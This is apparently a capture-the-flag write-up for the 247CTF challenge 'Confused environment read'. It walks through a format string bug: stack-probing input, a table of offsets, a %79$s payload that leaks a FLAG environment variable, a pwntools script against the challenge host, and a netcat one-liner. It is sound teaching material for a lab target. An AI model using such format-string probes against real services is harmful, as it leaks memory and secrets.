# Confused environment read - 247CTF PWN Challenge

## Challenge Info
- **Name**: Confused environment read
- **Category**: PWN
- **Remote**: `tcp://be5e6052dcced454.247ctf.com:50202`
- **Description**: "Can you abuse our confused environment service to obtain a read primitive?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Vulnerability

Classic **format string vulnerability** that allows reading arbitrary memory from the stack.

### Initial Test
```
Input:  AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Output: AAAA0x5660e877...0x41414141.0x252e7025
```

Our input `AAAA` (0x41414141) appears at **offset 11**, confirming format string vulnerability.

---

## Exploitation

### Strategy
Since this is a "read" challenge, the goal is to leak data from memory. Environment variables are stored on the stack at higher offsets.

### Finding the Flag
By iterating through stack offsets using `%N$s` format:

| Offset | Content |
|--------|---------|
| 13 | `/home/notroot/chall` (binary path) |
| 76 | `HOME=/home/notroot` |
| 77 | `PATH=/usr/local/sbin:...` |
| 78 | `PWD=/home/notroot` |
| **79** | **`FLAG=247CTF{...}`** |

### Payload
```
%79$s
```

This reads the string pointer at stack offset 79, which points to the `FLAG` environment variable.

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

p = remote('be5e6052dcced454.247ctf.com', 50202)
p.recvuntil(b'again?')
p.sendline(b'%79$s')
print(p.recvline().decode())
```

---

## Key Takeaways

1. **Format string read primitive**: `%N$s` reads string at stack offset N
2. **Environment variables on stack**: Stored at higher offsets, after local variables
3. **No binary needed**: Pure black-box exploitation by probing offsets

---

## One-liner
```bash
echo '%79$s' | nc be5e6052dcced454.247ctf.com 50202
```
